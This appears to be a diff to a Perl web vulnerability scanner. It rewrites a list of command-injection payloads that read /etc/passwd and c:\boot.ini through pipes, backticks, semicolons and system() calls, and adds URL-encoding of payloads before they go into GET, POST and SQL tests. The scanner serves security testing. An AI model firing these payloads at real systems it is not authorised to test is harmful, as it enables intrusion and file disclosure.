@@ -66,38 +66,38 @@ our @LFI = (
 		);
 
 our @RCE = (
-		'|cat%20/etc/passwd',
-		'|cat%20/etc/passwd|',
-		'|cat%20/etc/passwd%00|',
-		'|cat%20/etc/passwd%00.html|',
-		'|cat%20/etc/passwd%00.htm|',
-		'|cat%20/etc/passwd%00.dat|',
-		'system("cat%20/etc/passwd");',
-		'.system("cat%20/etc/passwd").',
-		':system("cat%20/etc/passwd");',
-		';system("cat%20/etc/passwd").',
-		';system("cat%20/etc/passwd")',
-		';system("cat%20/etc/passwd");',
-		':system("cat%20/etc/passwd").',
-		'`cat%20/etc/passwd`',
-		'`cat%20/etc/passwd`;',
-		';cat%20/etc/passwd;',
-		'|type%20c:\boot.ini',
-		'|type%20c:\boot.ini|',
-		'|type%20c:\boot.ini%00|',
-		'|type%20c:\boot.ini%00.html|',
-		'|type%20c:\boot.ini%00.htm|',
-		'|type%20c:\boot.ini%00.dat|',
-		'system("type%20c:\boot.ini");',
-		'.system("type%20c:\boot.ini").',
-		':system("type%20c:\boot.ini");',
-		';system("type%20c:\boot.ini").',
-		';system("type%20c:\boot.ini")',
-		';system("type%20c:\boot.ini");',
-		':system("type%20c:\boot.ini").',
-		'`type%20c:\boot.ini`',
-		'`type%20c:\boot.ini`;',
-		';type%20c:\boot.ini;'
+		'|cat /etc/passwd',
+		'|cat /etc/passwd|',
+		'|cat /etc/passwd%00|',
+		'|cat /etc/passwd%00.html|',
+		'|cat /etc/passwd%00.htm|',
+		'|cat /etc/passwd%00.dat|',
+		'system("cat /etc/passwd");',
+		'.system("cat /etc/passwd").',
+		':system("cat /etc/passwd");',
+		';system("cat /etc/passwd").',
+		';system("cat /etc/passwd")',
+		';system("cat /etc/passwd");',
+		':system("cat /etc/passwd").',
+		'`cat /etc/passwd`',
+		'`cat /etc/passwd`;',
+		';cat /etc/passwd;',
+		'|type c:\boot.ini',
+		'|type c:\boot.ini|',
+		'|type c:\boot.ini%00|',
+		'|type c:\boot.ini%00.html|',
+		'|type c:\boot.ini%00.htm|',
+		'|type c:\boot.ini%00.dat|',
+		'system("type c:\boot.ini");',
+		'.system("type c:\boot.ini").',
+		':system("type c:\boot.ini");',
+		';system("type c:\boot.ini").',
+		';system("type c:\boot.ini")',
+		';system("type c:\boot.ini");',
+		':system("type c:\boot.ini").',
+		'`type c:\boot.ini`',
+		'`type c:\boot.ini`;',
+		';type c:\boot.ini;'
 );
 
 
@@ -796,6 +796,7 @@ sub GenerateTests(){
 				if($var_temp){
 					foreach my $str (@{$test}){
 						$temp = $line;
+						$str = urlencode($str) if($conf{'url_encode'} == 1);
 						my $t = $var_temp . $str;
 						$temp =~ s/\Q$variables[$x]\E/$t/g;
 						push(@list2, $temp);
@@ -837,6 +838,7 @@ sub GenerateTestsPost(){
 				if($var_temp){
 					foreach my $str (@{$test}){
 						$temp = $line;
+						$str = urlencode($str) if($conf{'url_encode'} == 1);
 						my $t = $var_temp . $str;
 						$temp =~ s/\Q$variables[$x]\E/$t/g;
 						push(@list2, $url . '#' .$temp);
@@ -875,6 +877,7 @@ sub GenerateTestsSql(){
 				if($variables[$x]){
 					foreach my $str (@{$test}){
 						$temp = $line;
+						$str = urlencode($str) if($conf{'url_encode'} == 1);
 						my $t = $variables[$x] . $str;
 						$temp =~ s/\Q$variables[$x]\E/$t/g;
 						push(@list2, $temp);
@@ -913,6 +916,7 @@ sub GenerateTestsPostSql(){
 				if($variables[$x]){
 					foreach my $str (@{$test}){
 						$temp = $line;
+						$str = urlencode($str) if($conf{'url_encode'} == 1);
 						my $t = $variables[$x] . $str;
 						$temp =~ s/\Q$variables[$x]\E/$t/g;
 						push(@list2, $url . '#' .$temp);
@@ -1060,5 +1064,16 @@ sub Clear(){
 	my $self = shift;
 	$vulnerable = 0;
 }
+
+
+sub urlencode {
+    my $s = shift;
+    $s =~ s/ /+/g;
+    $s =~ s/([^A-Za-z0-9\+-])/sprintf("%%%02X", ord($1))/seg;
+    $s =~s/%7C/\|/g;
+    $s =~ s/%25/%/g;
+    return $s;
+}
+
 
 1;
